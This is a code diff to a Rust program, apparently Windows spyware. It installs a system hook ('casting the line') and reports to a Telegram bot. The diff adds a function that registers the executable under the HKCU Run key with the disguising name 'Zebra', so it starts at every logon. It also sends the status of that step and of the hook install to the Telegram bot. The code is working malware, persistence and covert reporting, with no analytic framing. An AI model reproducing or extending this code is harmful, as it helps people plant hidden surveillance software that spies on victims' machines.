@@ -18,6 +18,10 @@ use tokio;
 use std::ptr::null_mut;
 use dns_lookup::lookup_host;
 
+// для автозапуска
+use winreg::enums::*;
+use winreg::RegKey;
+
 mod config;
 
 // отправка сообщения в тг
@@ -148,12 +152,35 @@ fn is_site_open(url: &str) -> bool {
     }
 }
 
+
+// функция добавления в автозапуск
+fn add_to_startup() -> Result<(), Box<dyn std::error::Error>> {
+    let exe_path = std::env::current_exe()?;
+    let exe_path_str = exe_path.to_str().ok_or("Invalid executable path")?;
+
+    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+    let path = r"Software\Microsoft\Windows\CurrentVersion\Run";
+    let (key, _) = hkcu.create_subkey(path)?;
+
+    key.set_value("Zebra", &exe_path_str)?;
+
+    Ok(())
+}
+
 #[tokio::main]
 async fn main() {
+    // Добавление в автозапуск
+    if let Err(e) = add_to_startup() {
+        tokio::spawn(bot_sender(String::from("Failed to add to startup")));
+    } else {
+        tokio::spawn(bot_sender(String::from("Added to startup successfully")));
+    }
+
+
     // закидываем удочку
     let hook = set_hook();
     if hook.is_null() {
-        eprintln!("Failed to install hook!");
+        tokio::spawn(bot_sender(String::from("Failed to install hook!")));
         return;
     }
 
